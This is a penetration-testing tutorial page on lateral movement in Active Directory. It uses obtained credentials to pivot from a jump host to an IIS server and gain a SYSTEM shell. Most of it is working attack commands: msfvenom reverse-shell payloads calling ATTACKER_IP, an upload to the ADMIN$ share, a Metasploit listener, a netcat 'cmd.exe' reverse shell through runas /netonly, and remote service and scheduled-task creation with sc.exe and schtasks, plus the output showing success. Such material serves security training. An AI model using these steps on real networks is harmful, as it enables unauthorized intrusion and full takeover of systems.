# Example

Suppose the following scenario where we have obtained two sets of AD credentials:&#x20;

a. Low privileges (user)

b. Administrative access (admin)&#x20;

Our goal is to obtain a shell session on an _IIS_ server with administrative privileges. There are 2 servers we will be working with:

a. Intermediary (`jmp.test.com`)

b. IIS (`iis.test.com`)

Let's assume that the Intermediary server have no data that will be interesting to us, and it simply functions as an intermediary to get to the _IIS_ server. The main goal is the _IIS_ server, which is only accessible/routable from the intermediary server due to network restrictions, firewalls, etc.

The first set of AD credential allows us to gain a remote shell session on the intermediary machine (`jmp.domain`), via SSH.&#x20;

However, the _IIS_ server does not expose a SSH service. Thus, we need to make use of the session we have on the intermediary server to move laterally to the _IIS_ server (`iis.domain`) using the obtained admin credentials, to gain a remote session with administrative privileges.&#x20;

### (1) Using `sc.exe`&#x20;

{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)" %}

> For some of the sections in this example, we assume that we have the `nc64.exe` present in the system under `C:\tools`.

#### 1. SSH into the intermediary server (with the first set of low-privileged credentials)

```sh
$ ssh test.com\\user@jmp.test.com
```

This will provide us a command prompt:

```
C:\Users\user> whoami
user
```

#### 2. Craft the reverse shell payload (`msfvenom`) and upload it to the IIS server (with admin credentials)

We can use `msfvenom`  to craft a payload in the `exe-service` format, which allows us to encapsulate our payload inside a fully functional service executable.

{% code title="Attacker" overflow="wrap" %}
```sh
# take note of the LPORT value, it is required when we are starting the msfconsole listener
$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=9999 -o <service_exec_name>.exe
```
{% endcode %}

> Replace ATTACKER\_IP with IP address of your attacker machine

**Uploading the payload**

Now, we can upload the payload to the _IIS_ server (`smbclient`), and subsequently start a listener with `msfconsole` :

{% code title="Attacker" overflow="wrap" %}
```sh
# lets first identify the name of the admin share
$ smbclient -U admin -L '//iis.test.com' -W test.com
Sharename       Type      Comment
---------       ----      -------
 ADMIN$         Disk      Remote Admin
...

$ smbclient -c "put <service_exec_name>.exe" -U admin -W test.com '//iis.test.com/ADMIN$/' <password>
```
{% endcode %}

> Replace `service_exec_name>.exe` with the name of the executable file created with `msfvenom`

_Start the msfconsole listener (used to catch the shell in one of the later step):_

{% code title="Attacker" overflow="wrap" %}
```sh
$ msfconsole
msf6> use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST <local_addr>
msf6 exploit(multi/handler) > set LPORT 9999 
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 
```
{% endcode %}

{% embed url="https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient" %}

#### 3. Spawn a remote `/netonly` shell session on the intermediate server (as the admin)&#x20;

The reason we have to perform this step, is because the `sc.exe` command (refer to step 4. below) does not provide a built-in method to supply user credentials for another user aside from the one executing the command.

Start a listener on the attacker machine on eg. port **8888**

* This is the listener that provides us a remote shell session as the admin (next step)

{% code title="Attacker" %}
```sh
$ nc -lvnp 8888
```
{% endcode %}

From the remote shell session (step 1), we can spawn a new `/netonly` shell to allow us to perform network connections/requests as the admin:

{% code title="jmp.test.com (user)" overflow="wrap" %}
```sh
C:\Users\user> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 8888"
```
{% endcode %}

The listener on port **8888** will receive a remote command prompt on `jmp.test.com` as the admin:

{% code title="jmp.test.com (admin)" %}
```
C:\Windows\system32> whoami
user
```
{% endcode %}

> Notice that the `whoami` command in the new command prompt returns the name of the original user, instead of the admin user. This is because of the `/netonly` command which specifies that the supplied credentials should only be used for network connections, while normal commands will still be as the original user.

#### 4. Start a service (`sc.exe`) on the _IIS_ server that automatically executes the uploaded reverse shell payload

Now, with a shell session as the admin, we can create a service executable that calls our uploaded `msfvenom` payload created earlier:

{% code title="jmp.test.com (admin)" overflow="wrap" %}
```powershell
# start powershell
C:\> powershell

PS> sc.exe \\iis.test.com create rvshell binPath= "%windir%\service_exec_name>.exe" start= auto
PS> sc.exe \\iis.test.com start rvshell
```
{% endcode %}

Now, when the _IIS_ server startups, we will retrieve a reverse shell connection from the `msfconsole` session established earlier:

{% code title="iis.test.com (admin)" %}
```
C:\Windows/system32> hostname
iis

C:\Windows/system32> whoami
nt authority\system
```
{% endcode %}

> Notice that the `whoami` command now output the system user. This means that we have gained a remote shell as the administrator user!

**Additional notes**

_**(1)**_ Access will be denied if we attempt to create the service on the `iis.test.com` server as a normal user:

```powershell
C:\Users\user> sc.exe ...
[SC] OpenSCManager FAILED 5:

Access is denied.
```

_**(2)**_ It will not work as expected if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:

{% code title="jmp.test.com (admin)" overflow="wrap" %}
```powershell
C:\Windows\system32> sc.exe \\iis.test.com create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9999" start= auto

C:\Windows\system32> sc.exe \\iis.test.com start <servicename>
```
{% endcode %}

More accurately, this action will actually establish a remote shell on the target `iis.test.com` server, but will be terminated shortly after.

This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided. The method we have explored with `msfvenom` works as it encapsulates the payload within a valid service executable.

### 2. Using `schtasks`&#x20;

#### 1. SSH into the intermediary server, craft the reverse shell payload and upload to the IIS server

Follow the process in steps 1 and 2 in the first (with **sc.exe**), with the only difference that the reverse shell payload created with `msfvenom` should have the format `exe` instead of `exe-service` :

{% code overflow="wrap" %}
```sh
$ msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=9999 -o <exec_name>.exe
```
{% endcode %}

The steps to upload the created payload to the `admin$` share with `smbclient` , and to start the listener with `msfconsole` will be the same.

#### 2. Create and start a task (`schtasks`) on the target IIS machine that executes the uploaded reverse shell payload

In the first example (with **sc.exe**), we are required to use the `runas.exe` binary to provide ourselves with a `/netonly` command prompt to perform the `sc.exe` command with admin privileges. However, with the `schtasks` command, we are able to directly supply the user credentials for the user we want to perform the action as (in our case, this will be the admin user).

{% embed url="https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/lateral-movement-and-pivoting/spawning-remote-processes/schtasks-pending-test" %}

{% code title="Create the task on the target IIS machine" overflow="wrap" %}
```powershell
C:\Users\user> schtasks /create /s iis.test.com /ru "SYSTEM" /u admin /p pass /tn "revshell" /tr "%windir%\service_exec_name>.exe" /sc ONCE /st 00:00
```
{% endcode %}

> Replace `service_exec_name>.exe` with the name of the uploaded reverse shell payload.

* `/sd` : This flag can be omitted

{% code title="Run the task" overflow="wrap" %}
```powershell
C:\Users\user> schtasks /run /s iis.test.com /tn "revshell"
```
{% endcode %}

Now, we should retrieve a reverse shell connection (as the _**system**_ user) from the `msfconsole` session established earlier:

```powershell
C:\Windows/system32> hostname
iis

C:\Windows/system32> whoami
nt authority\system
```

### What we can learn

1. When we connect to the `admin$` SMB share with `smbclient` for upload, it will be automatically uploaded to the `%windir%` directory. This is because the `admin$` share maps to the `%windir%` (usually `C:\Windows` ) on the remote machine

* this the reason we prefix our `binPath` and `/tr` command (for _**sc**_ and _**schtasks**_ respectively) with `%windir%` when referencing the uploaded binary on the remote machine

